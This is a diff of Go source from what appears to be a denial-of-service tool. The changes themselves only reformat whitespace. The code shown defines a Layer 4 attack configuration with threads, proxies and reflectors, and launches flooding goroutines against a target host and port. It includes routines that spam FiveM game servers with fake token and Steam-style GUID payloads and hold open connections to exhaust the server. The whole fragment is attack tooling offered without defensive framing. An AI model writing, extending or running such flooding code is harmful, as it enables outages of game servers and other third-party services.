@@ -15,14 +15,14 @@ import (
 
 // Layer4Config holds configuration for Layer 4 attacks
 type Layer4Config struct {
-	Method      string
-	Host        string
-	Port        int
-	Threads     int
-	Duration    int
-	Proxies     []proxy.Proxy
-	Reflectors  []string
-	ProtocolID  int
+	Method     string
+	Host       string
+	Port       int
+	Threads    int
+	Duration   int
+	Proxies    []proxy.Proxy
+	Reflectors []string
+	ProtocolID int
 }
 
 // RunLayer4Attack executes a Layer 4 attack
@@ -31,7 +31,7 @@ func RunLayer4Attack(cfg *Layer4Config, wg *sync.WaitGroup, stopChan chan struct
 		wg.Add(1)
 		go func(threadID int) {
 			defer wg.Done()
-			
+
 			for {
 				select {
 				case <-stopChan:
@@ -259,7 +259,7 @@ func executeFIVEMTOKEN(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter
 			utils.RandString(4),
 			utils.RandString(12))
 		guid := fmt.Sprintf("%d", 76561197960265728+rand.Int63n(39734735271))
-		
+
 		payload := fmt.Sprintf("token=%s&guid=%s", token, guid)
 		n, err := conn.Write([]byte(payload))
 		if err != nil {
@@ -322,7 +322,7 @@ func executeCONNECTION(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter
 	if err != nil {
 		return
 	}
-	
+
 	go func() {
 		defer conn.Close()
 		buf := make([]byte, 1024)
@@ -333,7 +333,7 @@ func executeCONNECTION(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter
 			}
 		}
 	}()
-	
+
 	requestsSent.Add(1)
 	time.Sleep(5 * time.Second)
 }
